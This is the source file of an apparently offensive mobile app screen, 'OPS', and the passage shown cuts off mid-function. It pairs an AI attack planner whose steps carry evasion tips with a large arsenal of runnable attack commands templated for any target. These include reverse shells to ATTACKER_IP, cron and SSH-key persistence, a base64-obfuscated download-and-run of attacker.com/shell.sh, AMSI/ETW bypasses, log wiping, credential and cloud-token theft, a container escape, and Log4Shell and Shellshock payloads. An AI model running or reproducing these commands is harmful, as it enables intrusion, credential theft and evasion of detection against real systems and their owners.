/**
 * OPS — Operations Hub
 * Attacks registry · Arsenal (40+ real tools) · AI-Guided Attack Planner · Ops Log
 */
import React, { useState, useEffect, useCallback, useRef } from 'react';
import {
  View,
  Text,
  StyleSheet,
  FlatList,
  Pressable,
  TextInput,
  Modal,
  ScrollView,
  KeyboardAvoidingView,
  Platform,
  ActivityIndicator,
  Share,
  Animated,
  Easing,
} from 'react-native';
import { SafeAreaView, useSafeAreaInsets } from 'react-native-safe-area-context';
import MaterialIcons from '@expo/vector-icons/MaterialIcons';
import { useRouter } from 'expo-router';
import { useChatContext } from '@/hooks/useChatContext';
import { Colors, Typography, Spacing, Radius, Shadow } from '@/constants/theme';
import {
  SavedAttack, AttackSeverity, AttackType, AttackStatus,
  loadAttacks, saveAttack, deleteAttack, createAttack,
} from '@/services/attackStorage';
import {
  ExecLogEntry, LogEntryType,
  loadExecLog, deleteExecLogEntry, clearExecLog, exportExecLog, getLogStats, appendExecLog,
} from '@/services/executionLog';

const MONO = Platform.OS === 'ios' ? 'Menlo' : 'monospace';

const SEV_CFG: Record<AttackSeverity, { color: string; label: string }> = {
  info:     { color: '#3399ff', label: 'INFO' },
  low:      { color: '#00cc44', label: 'LOW'  },
  medium:   { color: '#ffaa00', label: 'MED'  },
  high:     { color: '#ff6600', label: 'HIGH' },
  critical: { color: '#ff2222', label: 'CRIT' },
};

const TYPE_CFG: Record<AttackType, { color: string; icon: string; label: string }> = {
  'zero-day':         { color: '#ff2222', icon: 'warning',    label: 'Zero-Day'  },
  'known-cve':        { color: '#ff8800', icon: 'bug-report', label: 'CVE'       },
  'technique':        { color: '#aa44ff', icon: 'layers',     label: 'Technique' },
  'misconfiguration': { color: '#3399ff', icon: 'settings',   label: 'Misconfig' },
  'custom':           { color: '#00ff41', icon: 'build',      label: 'Custom'    },
};

const STATUS_CFG: Record<AttackStatus, { color: string; label: string; icon: string }> = {
  discovered: { color: '#3399ff', label: 'Discovered', icon: 'search'       },
  confirmed:  { color: '#ffaa00', label: 'Confirmed',  icon: 'check-circle' },
  exploited:  { color: '#ff2222', label: 'Exploited',  icon: 'flash-on'     },
  patched:    { color: '#00ff41', label: 'Patched',    icon: 'shield'       },
  mitigated:  { color: '#00cc44', label: 'Mitigated',  icon: 'security'     },
};

const LOG_TYPE_CFG: Record<LogEntryType, { color: string; icon: string; label: string }> = {
  command:  { color: '#00ff41', icon: 'terminal',   label: 'CMD'    },
  analysis: { color: '#3399ff', icon: 'security',   label: 'ANALY'  },
  chat:     { color: '#aa44ff', icon: 'chat',       label: 'CHAT'   },
  attack:   { color: '#ff2222', icon: 'flash-on',   label: 'ATTACK' },
  recon:    { color: '#ffaa00', icon: 'radar',      label: 'RECON'  },
  exploit:  { color: '#ff6600', icon: 'bug-report', label: 'XPLOIT' },
};

type OpsTab = 'attacks' | 'arsenal' | 'ai' | 'log';

// ── AI Attack Plan Types ────────────────────────────────────────────────────
interface AttackStep {
  id: number;
  phase: string;
  name: string;
  description: string;
  mitre_id?: string;
  risk: 'low' | 'medium' | 'high' | 'critical';
  language: string;
  code: string;
  expected_output?: string;
  detection_risk?: string;
  evasion_tips?: string;
  // Runtime state
  status?: 'pending' | 'running' | 'done' | 'error' | 'skipped';
  output?: string;
  isError?: boolean;
  duration?: number;
}

interface AttackPlan {
  title: string;
  objective: string;
  target: string;
  mitre_tactics?: string[];
  opsec_level?: string;
  estimated_time?: string;
  prerequisites?: string[];
  steps: AttackStep[];
  cleanup?: string[];
  notes?: string;
}

// ── Arsenal data — 40+ real attack tools ────────────────────────────────────
interface ArsenalItem {
  id: string; name: string; category: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  mitreId?: string; description: string; command: string;
  language: string; tags: string[]; icon: string; color: string;
}

const ARSENAL: ArsenalItem[] = [
  // ── RECON ──
  { id:'r1',  name:'ICMP Host Discovery',      category:'Recon',        severity:'low',      mitreId:'T1018',     description:'Ping sweep to find live hosts on subnet.',           command:'for i in $(seq 1 254); do (ping -c 1 -W 1 {TARGET}.$i | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &); done; wait',  language:'bash',       tags:['recon','ping','sweep'],       icon:'radar',                color:'#3399ff' },
  { id:'r2',  name:'Nmap Full Port Scan',       category:'Recon',        severity:'medium',   mitreId:'T1046',     description:'All 65535 ports, SYN scan, service/version detection.',command:'nmap -sV -sC -p- -T4 --open --min-rate 3000 {TARGET}',                                                                  language:'bash',       tags:['recon','nmap','ports'],       icon:'radar',                color:'#3399ff' },
  { id:'r3',  name:'Nmap Vuln Scripts',         category:'Recon',        severity:'medium',   mitreId:'T1595',     description:'Run NSE vulnerability scripts against target.',          command:'nmap --script=vuln -sV -T4 {TARGET}',                                                                                     language:'bash',       tags:['recon','nmap','vuln'],        icon:'radar',                color:'#3399ff' },
  { id:'r4',  name:'Gobuster Dir Fuzz',         category:'Recon',        severity:'medium',   mitreId:'T1083',     description:'Web directory and file enumeration with common wordlist.',command:'gobuster dir -u http://{TARGET} -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt,js',                      language:'bash',       tags:['web','gobuster','fuzz'],      icon:'search',               color:'#3399ff' },
  { id:'r5',  name:'Subdomain Enumeration',     category:'Recon',        severity:'low',      mitreId:'T1590',     description:'DNS subdomain brute force and passive discovery.',        command:'subfinder -d {TARGET} -all -silent | tee subdomains.txt && cat subdomains.txt | httpx -silent -status-code',           language:'bash',       tags:['recon','dns','subdomain'],    icon:'public',               color:'#3399ff' },
  { id:'r6',  name:'Shodan Host Lookup',        category:'Recon',        severity:'low',      mitreId:'T1596',     description:'Query Shodan for open ports, services, vulns on IP.',    command:'python3 -c "import urllib.request,json; r=urllib.request.urlopen(f\'https://internetdb.shodan.io/{TARGET}\'); print(json.dumps(json.load(r),indent=2))"',  language:'python',  tags:['recon','osint','shodan'],     icon:'cloud-queue',          color:'#3399ff' },
  { id:'r7',  name:'HTTP Headers & Tech',       category:'Recon',        severity:'low',      mitreId:'T1592',     description:'Fingerprint web server, extract headers, detect tech stack.',command:'curl -sI http://{TARGET} && curl -s http://{TARGET} | grep -iE "(version|powered|framework|cms|jquery|bootstrap)" | head -20',  language:'bash',  tags:['web','fingerprint'],          icon:'http',                 color:'#3399ff' },
  { id:'r8',  name:'DNS Zone Transfer',         category:'Recon',        severity:'medium',   mitreId:'T1590.002', description:'Attempt DNS zone transfer to dump all DNS records.',     command:'dig axfr @{TARGET} {TARGET} 2>/dev/null || host -l {TARGET} {TARGET} 2>/dev/null || echo "Zone transfer failed (expected on hardened targets)"',  language:'bash',  tags:['dns','zone-transfer'],       icon:'dns',                  color:'#3399ff' },
  { id:'r9',  name:'SMB Null Session Enum',     category:'Recon',        severity:'medium',   mitreId:'T1135',     description:'Enumerate SMB shares, users, and policies via null session.',command:'smbclient -L //{TARGET} -N 2>&1 ; python3 -c "import subprocess; print(subprocess.run([\'rpcclient\',\'-U\',\'\',\'-N\',\'{TARGET}\',\'-c\',\'enumdomusers\'],capture_output=True,text=True).stdout)"',  language:'bash',  tags:['smb','enum','windows'],      icon:'device-hub',           color:'#3399ff' },
  { id:'r10', name:'Certificate Transparency',  category:'Recon',        severity:'low',      mitreId:'T1596.001', description:'Mine cert transparency logs for subdomains and hosts.',  command:'curl -s "https://crt.sh/?q=%.{TARGET}&output=json" | python3 -c "import json,sys; data=json.load(sys.stdin); [print(c[\'name_value\']) for c in data]" | sort -u | head -50',  language:'bash',  tags:['osint','ssl','certs'],       icon:'verified',             color:'#3399ff' },
  // ── WEB ──
  { id:'w1',  name:'SQLMap Autopwn',            category:'Web',          severity:'critical', mitreId:'T1190',     description:'Automated SQL injection detection and exploitation.',    command:'sqlmap -u "http://{TARGET}/index.php?id=1" --level=5 --risk=3 --dbs --dump --batch --random-agent --delay=0.5',       language:'bash',       tags:['web','sqli','sqlmap'],       icon:'data-array',           color:'#ff4400' },
  { id:'w2',  name:'XSS Probe Set',             category:'Web',          severity:'medium',   mitreId:'T1059.007', description:'Test multiple XSS payloads across common parameters.',  command:'for param in q search id name input; do curl -sk "http://{TARGET}/?${param}=<script>alert(document.cookie)</script>" | grep -i "script" && echo "VULNERABLE: $param"; done',  language:'bash',  tags:['web','xss'],                 icon:'code',                 color:'#ff4400' },
  { id:'w3',  name:'LFI Path Traversal',        category:'Web',          severity:'high',     mitreId:'T1083',     description:'Test local file inclusion across common endpoints.',     command:'for path in "/../../../etc/passwd" "/....//....//....//etc/passwd" "/%2e%2e%2f%2e%2e%2fetc/passwd" "/.%252e/.%252e/etc/passwd"; do r=$(curl -sk "http://{TARGET}/page?file=$path"); echo "$path: $(echo $r | grep -c root) hits"; done',  language:'bash',  tags:['web','lfi','traversal'],     icon:'folder-open',          color:'#ff4400' },
  { id:'w4',  name:'SSRF Scanner',              category:'Web',          severity:'high',     mitreId:'T1190',     description:'Server-Side Request Forgery probes targeting internal services.',command:'for url in "http://169.254.169.254/latest/meta-data/" "http://localhost:80/" "http://[::1]:22" "http://192.168.0.1/"; do echo -n "$url: "; curl -sk --max-time 3 "http://{TARGET}/fetch?url=$url" | head -1; done',  language:'bash',  tags:['web','ssrf'],                icon:'swap-horiz',           color:'#ff4400' },
  { id:'w5',  name:'JWT None Alg Attack',       category:'Web',          severity:'high',     mitreId:'T1059',     description:'Forge JWT with alg:none to bypass authentication.',      command:'python3 -c "\nimport base64,json\nh=base64.urlsafe_b64encode(json.dumps({\'alg\':\'none\',\'typ\':\'JWT\'}).encode()).rstrip(b\'=\')\np=base64.urlsafe_b64encode(json.dumps({\'sub\':\'admin\',\'role\':\'admin\'}).encode()).rstrip(b\'=\')\nprint(h.decode()+\'.\'+p.decode()+\'.\')\n"',  language:'python',  tags:['web','jwt','auth'],          icon:'key',                  color:'#ff4400' },
  { id:'w6',  name:'CORS Misconfiguration',     category:'Web',          severity:'medium',   mitreId:'T1190',     description:'Detect CORS misconfigurations that allow credential theft.',command:'curl -sI -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" http://{TARGET} | grep -i "access-control"',  language:'bash',  tags:['web','cors'],                icon:'security',             color:'#ff4400' },
  { id:'w7',  name:'Admin Panel Finder',        category:'Web',          severity:'medium',   mitreId:'T1083',     description:'Brute force common admin panel URLs.',                   command:'for path in admin administrator wp-admin login panel backend manager console phpmyadmin cpanel; do code=$(curl -so /dev/null -w "%{http_code}" http://{TARGET}/$path 2>/dev/null); [ "$code" != "404" ] && [ "$code" != "000" ] && echo "[$code] http://{TARGET}/$path"; done',  language:'bash',  tags:['web','admin','brute'],       icon:'admin-panel-settings', color:'#ff4400' },
  // ── NETWORK ──
  { id:'n1',  name:'Hydra SSH Brute',           category:'Network',      severity:'high',     mitreId:'T1110.001', description:'SSH brute force with rockyou wordlist.',                command:'hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 -f ssh://{TARGET}:22 2>&1 | tail -5',                            language:'bash',       tags:['network','bruteforce','ssh'],icon:'vpn-key',              color:'#aa44ff' },
  { id:'n2',  name:'Hydra FTP Brute',           category:'Network',      severity:'medium',   mitreId:'T1110.001', description:'FTP credential brute force with common passwords.',      command:'hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ftp://{TARGET} -t 4 2>&1 | tail -5',  language:'bash',  tags:['network','bruteforce','ftp'],icon:'vpn-key',              color:'#aa44ff' },
  { id:'n3',  name:'Responder LLMNR Poison',    category:'Network',      severity:'critical', mitreId:'T1557.001', description:'Poison LLMNR/NBT-NS to capture NTLM hashes.',           command:'responder -I eth0 -rdwv 2>&1 | head -30 || echo "Responder not available in sandbox — use on local network: sudo responder -I eth0 -rdwv"',  language:'bash',  tags:['mitm','responder','ntlm'],   icon:'wifi-tethering',       color:'#aa44ff' },
  { id:'n4',  name:'ARP Scan Local Net',        category:'Network',      severity:'low',      mitreId:'T1018',     description:'ARP-based host discovery on local network.',             command:'python3 -c "\nimport socket,struct,sys\nprint(socket.gethostbyname(socket.gethostname()))\n" && arp -a 2>/dev/null || ip neigh show 2>/dev/null || echo "ARP table unavailable in sandbox"',  language:'bash',  tags:['network','arp','discovery'],  icon:'device-hub',           color:'#aa44ff' },
  { id:'n5',  name:'Port Knocking Probe',       category:'Network',      severity:'low',      mitreId:'T1046',     description:'Identify open services with banner grabbing.',           command:'for port in 21 22 23 25 53 80 110 143 443 445 3306 3389 5432 5900 6379 8080 8443 27017; do timeout 1 bash -c "echo > /dev/tcp/{TARGET}/$port" 2>/dev/null && echo "OPEN: $port"; done',  language:'bash',  tags:['network','scan','banner'],   icon:'signal-wifi-4-bar',    color:'#aa44ff' },
  { id:'n6',  name:'Netcat Reverse Shell Catcher',category:'Network',    severity:'critical', mitreId:'T1059.004', description:'Set up listener to catch reverse shell connections.',    command:'echo "Start listener: nc -lvnp 4444"\necho "Then trigger on target with:"\necho "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"\necho "Or: python3 -c \\"import socket,subprocess,os;s=socket.socket();s.connect((ATTACKER_IP,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([/bin/sh,-i])\\""\nnc -lvnp 4444 2>&1 || echo "nc not available — use on attacker machine"',  language:'bash',  tags:['network','reverse-shell'],  icon:'terminal',             color:'#aa44ff' },
  // ── EXPLOITATION ──
  { id:'e1',  name:'Bash Reverse Shell',        category:'Exploitation', severity:'critical', mitreId:'T1059.004', description:'Classic bash reverse shell one-liner.',                 command:'bash -i >& /dev/tcp/{TARGET}/4444 0>&1',                                                                                  language:'bash',       tags:['exploit','reverse-shell'],  icon:'terminal',             color:'#ff2222' },
  { id:'e2',  name:'Python Reverse Shell',      category:'Exploitation', severity:'critical', mitreId:'T1059.006', description:'Python reverse shell — works on most Linux systems.',  command:'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{TARGET}\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"',  language:'python',  tags:['exploit','reverse-shell'],  icon:'terminal',             color:'#ff2222' },
  { id:'e3',  name:'msfvenom Windows Payload',  category:'Exploitation', severity:'critical', mitreId:'T1587.001', description:'Generate Windows x64 Meterpreter reverse TCP payload.', command:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={TARGET} LPORT=4444 -f exe -o shell.exe 2>&1 | tail -5\necho "Transfer via: python3 -m http.server 8080"',  language:'bash',  tags:['exploit','msfvenom','windows'],icon:'bug-report',          color:'#ff2222' },
  { id:'e4',  name:'Log4Shell PoC (CVE-2021-44228)',category:'Exploitation',severity:'critical',mitreId:'T1190',  description:'Log4Shell JNDI injection payload for vulnerable Log4j2 servers.',command:'curl -sH "X-Api-Version: \${jndi:ldap://{TARGET}:1389/a}" http://{TARGET}/api/ -o /dev/null -w "%{http_code}"\ncurl -sH "User-Agent: \${jndi:dns://{TARGET}/log4shell}" http://{TARGET}/ -o /dev/null -w "%{http_code}"',  language:'bash',  tags:['cve','log4j','rce'],         icon:'warning',              color:'#ff2222' },
  { id:'e5',  name:'ShellShock (CVE-2014-6271)',category:'Exploitation',  severity:'critical', mitreId:'T1190',     description:'Bash shellshock via CGI endpoint injection.',           command:'curl -sH "User-Agent: () { :;}; echo; /bin/cat /etc/passwd" http://{TARGET}/cgi-bin/status 2>&1 | head -10\ncurl -sH "Referer: () { :;}; echo; id" http://{TARGET}/cgi-bin/ 2>&1 | head -5',  language:'bash',  tags:['cve','shellshock','bash'],   icon:'warning',              color:'#ff2222' },
  { id:'e6',  name:'EternalBlue Check (MS17-010)',category:'Exploitation',severity:'critical', mitreId:'T1210',    description:'Check if target is vulnerable to EternalBlue SMB exploit.',command:'python3 -c "\nimport socket\ntry:\n  s=socket.socket()\n  s.settimeout(3)\n  s.connect((\"{TARGET}\",445))\n  print(\"SMB port open — potential MS17-010 target\")\n  s.close()\nexcept: print(\"SMB port closed or filtered\")\n"',  language:'python',  tags:['cve','eternalblue','smb'],   icon:'warning',              color:'#ff2222' },
  // ── POST-EXPLOIT ──
  { id:'p1',  name:'Full System Enumeration',   category:'Post-Exploit', severity:'low',      mitreId:'T1082',     description:'Comprehensive system info, users, network, sudo rights.', command:'echo "=== SYSTEM ==="; uname -a; cat /etc/os-release 2>/dev/null | head -3\necho "=== USER ==="; id; whoami; groups\necho "=== NETWORK ==="; ip a 2>/dev/null || ifconfig 2>/dev/null\necho "=== SUDO ==="; sudo -l 2>/dev/null\necho "=== PROCESSES ==="; ps aux | head -15\necho "=== SUID ==="; find / -perm -4000 -type f 2>/dev/null | head -10',  language:'bash',  tags:['post-exploit','enum'],       icon:'info',                 color:'#00ff41' },
  { id:'p2',  name:'LinPEAS PrivEsc Scan',      category:'Post-Exploit', severity:'high',     mitreId:'T1068',     description:'Run LinPEAS automated privilege escalation scanner.',    command:'curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash 2>/dev/null | head -100 || echo "Download failed — sandbox may block external requests. Run manually on target."',  language:'bash',  tags:['privesc','linpeas'],         icon:'arrow-upward',         color:'#00ff41' },
  { id:'p3',  name:'SUID/SGID Exploit Hunt',    category:'Post-Exploit', severity:'high',     mitreId:'T1548.001', description:'Find SUID/SGID binaries and check GTFOBins exploitability.',command:'echo "=== SUID Binaries ==="\nfind / -perm -4000 -type f 2>/dev/null\necho "=== SGID Binaries ==="\nfind / -perm -2000 -type f 2>/dev/null\necho "=== World-writable dirs ==="\nfind / -writable -type d 2>/dev/null | grep -v proc | head -10',  language:'bash',  tags:['privesc','suid','gtfobins'], icon:'arrow-upward',         color:'#00ff41' },
  { id:'p4',  name:'Cron Backdoor Persistence', category:'Post-Exploit', severity:'high',     mitreId:'T1053.003', description:'Add cron job for persistent reverse shell callback.',   command:'echo "CURRENT CRONTAB:"\ncrontab -l 2>/dev/null\necho ""\necho "ADD PERSISTENCE (adjust IP/port):"\necho "(crontab -l 2>/dev/null; echo \'*/5 * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\') | crontab -"',  language:'bash',  tags:['persistence','cron'],        icon:'settings-backup-restore',color:'#00ff41' },
  { id:'p5',  name:'SSH Key Persistence',       category:'Post-Exploit', severity:'high',     mitreId:'T1098.004', description:'Add attacker SSH public key to authorized_keys.',       command:'echo "Generate key on attacker: ssh-keygen -t ed25519 -f axiom_key"\necho "Then run on target:"\necho "mkdir -p ~/.ssh && chmod 700 ~/.ssh"\necho "echo \'PASTE_PUBLIC_KEY\' >> ~/.ssh/authorized_keys"\necho "chmod 600 ~/.ssh/authorized_keys"\nls -la ~/.ssh/ 2>/dev/null',  language:'bash',  tags:['persistence','ssh'],         icon:'vpn-key',              color:'#00ff41' },
  { id:'p6',  name:'Memory Credential Dump',    category:'Post-Exploit', severity:'critical', mitreId:'T1003',     description:'Attempt to extract credentials from memory and files.',  command:'echo "=== /etc/shadow ==="; cat /etc/shadow 2>/dev/null | head -5 || echo "Permission denied"\necho "=== ~/.bash_history ==="; cat ~/.bash_history 2>/dev/null | grep -iE "pass|pwd|token|key|secret" | head -10\necho "=== Environment secrets ==="; env | grep -iE "pass|key|token|secret|api" | head -10\necho "=== .ssh keys ==="; ls -la ~/.ssh/ 2>/dev/null',  language:'bash',  tags:['creds','memory','dump'],     icon:'memory',               color:'#00ff41' },
  // ── ACTIVE DIRECTORY ──
  { id:'a1',  name:'Kerberoasting',             category:'Active Dir.',  severity:'critical', mitreId:'T1558.003', description:'Request TGS tickets for service accounts to crack offline.',command:'python3 -c "\ntry:\n  from impacket.examples.GetUserSPNs import main\n  print(\"Run: python3 GetUserSPNs.py -request -dc-ip {TARGET} DOMAIN/user:pass -outputfile hashes.txt\")\nexcept ImportError:\n  print(\"impacket not installed — run on Kali/attacker machine\")\n  print(\"Command: GetUserSPNs.py -request -dc-ip {TARGET} DOMAIN/user:pass\")\n"',  language:'python',  tags:['ad','kerberos','kerberoasting'],icon:'account-tree',        color:'#cc2222' },
  { id:'a2',  name:'BloodHound Collection',     category:'Active Dir.',  severity:'high',     mitreId:'T1069.002', description:'Collect AD data for BloodHound attack path analysis.',  command:'python3 -c "print(\'Run on target: bloodhound-python -d DOMAIN -u user -p pass -ns {TARGET} -c All --zip\')"\necho "Or use SharpHound on Windows: SharpHound.exe -c All --zipfilename data.zip"',  language:'bash',       tags:['ad','bloodhound','recon'],   icon:'account-tree',         color:'#cc2222' },
  { id:'a3',  name:'Pass-the-Hash (PTH)',        category:'Active Dir.',  severity:'critical', mitreId:'T1550.002', description:'Authenticate using NTLM hash without cracking password.',command:'echo "Using impacket psexec (run on attacker):"\necho "psexec.py -hashes :NTLM_HASH DOMAIN/Administrator@{TARGET} cmd.exe"\necho ""\necho "Or wmiexec:"\necho "wmiexec.py -hashes :NTLM_HASH DOMAIN/user@{TARGET}"',  language:'bash',  tags:['ad','pth','lateral'],        icon:'lock',                 color:'#cc2222' },
  { id:'a4',  name:'DCSync Attack',             category:'Active Dir.',  severity:'critical', mitreId:'T1003.006', description:'Replicate DC to dump all domain hashes (requires Domain Replication rights).',command:'echo "DCSync via impacket secretsdump:"\necho "secretsdump.py -just-dc DOMAIN/user:pass@{TARGET}"\necho ""\necho "All domain hashes saved to secretsdump_output.txt"\necho "Crack with: hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt"',  language:'bash',  tags:['ad','dcsync','dcsync'],     icon:'admin-panel-settings', color:'#cc2222' },
  // ── EVASION ──
  { id:'v1',  name:'AMSI Bypass (PowerShell)',  category:'Evasion',      severity:'high',     mitreId:'T1562.001', description:'Disable Windows AMSI to allow malicious PS execution.',command:"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\nWrite-Host \"AMSI Disabled\"",  language:'powershell',  tags:['evasion','amsi','windows'],  icon:'visibility-off',       color:'#00cc44' },
  { id:'v2',  name:'ETW Patching (PowerShell)', category:'Evasion',      severity:'high',     mitreId:'T1562.006', description:'Patch ETW to blind event log tracing.',                command:"$EtwEventWrite=[System.Diagnostics.Eventing.EventProvider].GetMethod('m_enabled',([System.Reflection.BindingFlags]'NonPublic,Instance'))\n[System.Runtime.InteropServices.Marshal]::WriteInt32($EtwEventWrite.FieldHandle.Value,0)\nWrite-Host \"ETW patched\"",  language:'powershell',  tags:['evasion','etw','windows'],   icon:'visibility-off',       color:'#00cc44' },
  { id:'v3',  name:'Base64 Payload Obfuscation',category:'Evasion',      severity:'medium',   mitreId:'T1027',     description:'Encode payload in base64 to evade signature detection.',command:'PAYLOAD="curl -s http://attacker.com/shell.sh | bash"\nENCODED=$(echo "$PAYLOAD" | base64 -w 0)\necho "Encoded: $ENCODED"\necho "Execute: echo $ENCODED | base64 -d | bash"\necho "$ENCODED" | base64 -d | bash',  language:'bash',  tags:['evasion','obfuscation'],     icon:'code',                 color:'#00cc44' },
  { id:'v4',  name:'Log Clearing',              category:'Evasion',      severity:'high',     mitreId:'T1070.001', description:'Clear system logs and bash history to remove evidence.',command:'echo "Clearing bash history..."; history -c; echo "" > ~/.bash_history\necho "Clearing syslog (requires root):"; truncate -s 0 /var/log/syslog 2>/dev/null || echo "Need root for syslog"\necho "Clearing auth log:"; truncate -s 0 /var/log/auth.log 2>/dev/null || echo "Need root for auth.log"\necho "Checking wtmp:"; last | head -5',  language:'bash',  tags:['evasion','log-clearing'],    icon:'delete-sweep',         color:'#00cc44' },
  // ── CLOUD ──
  { id:'c1',  name:'AWS IMDS Token Theft',      category:'Cloud',        severity:'critical', mitreId:'T1552.005', description:'Steal IAM credentials from AWS Instance Metadata Service.',command:'curl -sH "X-aws-ec2-metadata-token-ttl-seconds: 21600" -X PUT http://169.254.169.254/latest/api/token > /tmp/imds_token 2>/dev/null\nTOKEN=$(cat /tmp/imds_token)\ncurl -sH "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || echo "Not on AWS EC2 instance"',  language:'bash',  tags:['cloud','aws','imds'],        icon:'cloud-done',           color:'#ff2266' },
  { id:'c2',  name:'AWS Credential Enum',       category:'Cloud',        severity:'high',     mitreId:'T1526',     description:'Enumerate AWS services and permissions with stolen creds.',command:'echo "Run with AWS creds configured:"\necho "aws sts get-caller-identity"\necho "aws s3 ls"\necho "aws iam list-users"\necho "aws ec2 describe-instances --query Reservations[].Instances[].{IP:PublicIpAddress,State:State.Name}"\naws sts get-caller-identity 2>/dev/null || echo "AWS CLI not configured"',  language:'bash',  tags:['cloud','aws','enum'],        icon:'cloud',                color:'#ff2266' },
  { id:'c3',  name:'Docker Socket Escape',      category:'Cloud',        severity:'critical', mitreId:'T1611',     description:'Escape container via exposed Docker socket.',            command:'ls -la /var/run/docker.sock 2>/dev/null && echo "Docker socket EXPOSED!" || echo "Docker socket not exposed"\nif [ -S /var/run/docker.sock ]; then\n  docker run -v /:/host --rm -it alpine chroot /host sh -c "id && cat /etc/shadow | head -3"\nfi',  language:'bash',  tags:['cloud','docker','escape'],   icon:'logout',               color:'#ff2266' },
  { id:'c4',  name:'K8s Service Account Abuse', category:'Cloud',        severity:'critical', mitreId:'T1552.007', description:'Steal K8s service account token and query API server.',  command:'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)\nif [ -n "$TOKEN" ]; then\n  echo "Service account token found!"\n  curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces | python3 -m json.tool | head -20\nelse\n  echo "Not running in Kubernetes pod"\nfi',  language:'bash',  tags:['cloud','k8s','container'],   icon:'layers',               color:'#ff2266' },
  // ── CRYPTO / PASSWORD ──
  { id:'cr1', name:'Hashcat MD5 Crack',         category:'Crypto',       severity:'medium',   mitreId:'T1110.002', description:'Crack MD5 hashes using rockyou wordlist.',              command:'echo "5f4dcc3b5aa765d61d8327deb882cf99" > /tmp/hashes.txt\necho "Testing MD5 crack (password123):"\npython3 -c "\nimport hashlib,sys\nhashes={\"5f4dcc3b5aa765d61d8327deb882cf99\":\"unknown\"}\nfor word in [\"password\",\"password123\",\"admin\",\"letmein\",\"123456\"]:\n  h=hashlib.md5(word.encode()).hexdigest()\n  if h in hashes: print(f\"CRACKED: {h} = {word}\")\n"',  language:'python',  tags:['crypto','hashcat','crack'],  icon:'lock-open',            color:'#ffcc00' },
  { id:'cr2', name:'JWT Secret Brute Force',    category:'Crypto',       severity:'high',     mitreId:'T1110',     description:'Brute force JWT HMAC-SHA256 signing secret.',            command:'python3 -c "\nimport hmac,hashlib,base64,json\ntoken_b64=\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ\"\nfor secret in [\"secret\",\"password\",\"jwt_secret\",\"mysecret\",\"supersecret\",\"admin\"]:\n  sig=base64.urlsafe_b64encode(hmac.new(secret.encode(),token_b64.encode(),hashlib.sha256).digest()).rstrip(b\"=\").decode()\n  print(f\"{secret}: {sig[:20]}...\")\n  print(\"Try: \"+token_b64+\".\"+sig)\n  break\n"',  language:'python',  tags:['crypto','jwt','brute'],      icon:'key',                  color:'#ffcc00' },
];

const ARSENAL_CATS = ['All','Recon','Web','Network','Exploitation','Post-Exploit','Active Dir.','Evasion','Cloud','Crypto'];
const ATTACK_SEVERITIES: AttackSeverity[] = ['info','low','medium','high','critical'];
const ATTACK_TYPES: AttackType[] = ['zero-day','known-cve','technique','misconfiguration','custom'];
const ATTACK_STATUSES: AttackStatus[] = ['discovered','confirmed','exploited','patched','mitigated'];

const RISK_COLORS: Record<string, string> = {
  low: '#00cc44', medium: '#ffaa00', high: '#ff6600', critical: '#ff2222',
};

const OPSEC_COLORS: Record<string, string> = {
  ghost: '#00ff41', quiet: '#88ff00', moderate: '#ffaa00', loud: '#ff2222',
};

const PHASE_COLORS: Record<string, string> = {
  Recon: '#3399ff', 'Initial Access': '#ff8800', Execution: '#ff4400',
  Persistence: '#ffcc00', PrivEsc: '#ff6600', DefEvasion: '#00cc44',
  CredAccess: '#aa44ff', LateralMove: '#ff2266', Collection: '#3399ff',
  C2: '#00aaff', Exfil: '#ff8800', Impact: '#ff2222',
};

export default function OpsScreen() {
  const [activeTab, setActiveTab] = useState<OpsTab>('attacks');
  const insets = useSafeAreaInsets();
  const { injectPrompt } = useChatContext();
  const router = useRouter();

  // ── Attacks state ─────────────────────────────────────────────────────────
  const [attacks, setAttacks] = useState<SavedAttack[]>([]);
  const [attackSearch, setAttackSearch] = useState('');
  const [attackSevFilter, setAttackSevFilter] = useState<AttackSeverity | 'all'>('all');
  const [selectedAttack, setSelectedAttack] = useState<SavedAttack | null>(null);
  const [showAttackForm, setShowAttackForm] = useState(false);
  const [editDraft, setEditDraft] = useState<SavedAttack | null>(null);

  useEffect(() => { loadAttacks().then(setAttacks); }, []);

  const filteredAttacks = attacks.filter(a => {
    if (attackSevFilter !== 'all' && a.severity !== attackSevFilter) return false;
    if (attackSearch) {
      const q = attackSearch.toLowerCase();
      return a.title.toLowerCase().includes(q) || (a.cve||'').toLowerCase().includes(q) || a.description.toLowerCase().includes(q);
    }
    return true;
  });

  const handleSaveAttack = useCallback(async (draft: SavedAttack) => {
    const updated = await saveAttack({ ...draft, updatedAt: new Date() });
    setAttacks(updated); setShowAttackForm(false); setEditDraft(null);
  }, []);

  const handleDeleteAttack = useCallback(async (id: string) => {
    const updated = await deleteAttack(id);
    setAttacks(updated); setSelectedAttack(null);
  }, []);

  const handleAttackDeepDive = useCallback((attack: SavedAttack) => {
